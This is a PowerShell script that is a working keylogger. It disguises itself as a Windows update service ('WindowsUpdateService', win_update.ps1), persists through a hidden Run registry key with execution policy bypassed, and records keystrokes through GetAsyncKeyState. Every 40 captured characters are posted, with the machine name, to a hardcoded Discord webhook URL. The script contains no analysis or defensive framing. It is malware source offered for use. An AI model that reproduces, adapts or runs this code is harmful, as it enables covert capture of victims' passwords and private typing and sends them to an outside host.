# Configuration
$WebhookUrl = "https://discord.com/api/webhooks/1348482615879139408/8WWmsASLCd2mVWVyInAUh0I_RprgBGRdWG1cDLWLptSvFtHwyJMetbIHQ_VfPdayeu_0"
$ProcName = "WindowsUpdateService"
$FilePath = "$env:APPDATA\win_update.ps1"

# 1. Fixed Persistence Logic for IEX Execution
$ScriptContent = @'
$WebhookUrl = "https://discord.com/api/webhooks/1348482615879139408/8WWmsASLCd2mVWVyInAUh0I_RprgBGRdWG1cDLWLptSvFtHwyJMetbIHQ_VfPdayeu_0"
Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class K{[DllImport(`"user32.dll`")]public static extern short GetAsyncKeyState(int v);}"
$Log = ""; $Machine = $env:COMPUTERNAME
while($true){
    Start-Sleep -m 100
    for($i=8;$i -le 190;$i++){
        if([K]::GetAsyncKeyState($i) -eq -32767){
            $Log += [char]$i
            if($Log.Length -ge 40){
                $Payload = @{username=$Machine; content=$Log} | ConvertTo-Json
                Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType "application/json"
                $Log = ""
            }
        }
    }
}
'@

# If the file doesn't exist, create it and set the registry key
if (-not (Test-Path $FilePath)) {
    $ScriptContent | Out-File -FilePath $FilePath -Encoding ascii
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    New-ItemProperty -Path $RegPath -Name $ProcName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FilePath`"" -PropertyType String -Force
}

# 2. Execute the logic immediately for this session
Invoke-Expression $ScriptContent
